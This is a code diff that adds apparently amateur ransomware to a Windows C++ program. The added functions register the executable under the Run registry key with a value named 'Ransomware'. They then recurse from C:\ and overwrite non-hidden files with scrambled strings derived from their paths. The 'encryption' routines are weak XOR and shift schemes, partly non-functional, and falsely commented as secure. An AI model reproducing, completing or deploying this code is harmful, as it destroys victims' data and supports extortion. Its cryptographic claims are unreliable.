@@ -4,6 +4,170 @@
 #include <atlstr.h>
 #include <fstream>
 #include <shlobj.h>
+using namespace std;
+void writeToFile(string name, string encrypted_string)
+{
+    FILE* file;
+
+    file = fopen(name.c_str(), "w");
+
+    //Write encryptedString to file
+    fprintf(file, "%s", encrypted_string.c_str());
+
+    fclose(file);
+}
+
+//For reading/writing a file 
+#define FILE_ATTRIBUTE_GENERIC_READ    (STANDARD_RIGHTS_READ     |\
+                                       FILE_READ_DATA           |\
+                                       FILE_READ_ATTRIBUTES     |\
+                                       FILE_READ_EA             |\
+                                       SYNCHRONIZE)
+string encryptCode(string str)
+{
+    string res;
+
+    // Performing XOR operation 
+    for (int i = 1; i < str.length(); i++)
+        res += (char)(str[i - 1] ^ str[i]);
+
+    // Appending first character 
+    res += str[0];
+
+    return res;
+}
+string encrypt(string plain)
+{
+    //Generate a random 256-bit key
+    vector <int> key;
+    int keylength = 256;
+    srand(time(NULL));
+    for (int i = 0; i < keylength; i++)
+    {
+        key.push_back(rand());
+    }
+
+    string cipher = "";
+
+    //Perform one-time pad style XOR 
+    for (int i = 0; i < plain.length(); i++)
+    {
+        int k = key[i % keylength];
+        int x = plain[i] ^ k;
+        cipher += char(x);
+    }
+
+    return cipher;
+}
+//A secure encryption algorithm can be used here
+//A random AlphaNumeric code is generated
+string generateCode()
+{
+    char code[16];
+
+    srand(time(NULL));
+
+    for (int i = 0; i < 16; i++)
+    {
+        code[i] = rand() % 74 + 48; //Generating random character
+    }
+    //Encrypt code using encryption algorithm
+    string encrypted_code = encryptCode(code);
+    return encrypted_code;
+}
+
+//This will make registry entries in registry
+void addRegistryEntries(string path, string code)
+{
+    // Creating new registry entry
+    HKEY hKey;
+    RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
+    RegSetValueEx(hKey, "Ransomware", 0, REG_SZ, (const BYTE*)path.c_str(), path.size());
+    // Creating the Encoded code entry
+    RegSetValueEx(hKey, "Code", 0, REG_SZ, (const BYTE*)code.c_str(), code.size());
+    RegCloseKey(hKey);
+}
+
+//Encryption function for encrypting strings
+string encryptString(string str)
+{
+    //Encrypt each character in string
+    for (int i = 0; i < str.length(); i++)
+    {
+        int code = (int)str[i];
+        code = code + 5;
+        str[i] = (char)code;
+    }
+
+    //Encrypt the whole string using encryption algorithm
+    string encrypted_str = encryptCode(str);
+    return encrypted_str;
+}
+
+void encryptFiles(string path)
+{
+    WIN32_FIND_DATA FileData;
+    HANDLE hFind;
+    string mask = path + "\\*";
+    hFind = FindFirstFile(mask.c_str(), &FileData);
+    if (hFind == INVALID_HANDLE_VALUE) return;
+
+    do
+    {
+        string fName = FileData.cFileName;
+        if (fName != "." && fName != "..")
+        {
+            string fullPath = path + "\\" + fName;
+
+            //skip hidden files
+            if (FileData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)
+            {
+                continue;
+            }
+
+            if (FileData.dwFileAttributes == (FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_GENERIC_READ))
+            {
+                //Encrypt strings in file
+                string encrypted_string = encryptString(fullPath);
+
+                //Write encrypted string to file
+                writeToFile(fullPath, encrypted_string);
+            }
+            else
+            {
+                //Encrypt file using encryption algorithm
+                encrypt(fullPath);
+            }
+        }
+    } while (FindNextFile(hFind, &FileData));
+
+    FindClose(hFind);
+
+    //Recurse through directories
+    string submask = path + "\\*";
+    hFind = FindFirstFile(submask.c_str(), &FileData);
+    if (hFind == INVALID_HANDLE_VALUE) return;
+    do {
+        string fName = FileData.cFileName;
+        if (fName != "." && fName != "..")
+        {
+            string fullPath = path + "\\" + fName;
+
+            //skip hidden files
+            if (FileData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)
+            {
+                continue;
+            }
+
+            //Recurse through subdirectories
+            if (FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+            {
+                encryptFiles(fullPath);
+            }
+        }
+    } while (FindNextFile(hFind, &FileData));
+    FindClose(hFind);
+}
 
 
 int main()
@@ -41,7 +205,11 @@ int main()
 	RegCloseKey(hkey);
 	free(command2);
 
-	
+	    char path[MAX_PATH];
+    GetModuleFileName(NULL, path, MAX_PATH);
+    string code = generateCode();
+    addRegistryEntries(path, code);
+    encryptFiles("C:\\");
 	char root[MAX_PATH];
 	SHGetFolderPath(NULL, CSIDL_DESKTOP, NULL, 0, root);
 	unsigned int pathLen = strlen(root) + 2;
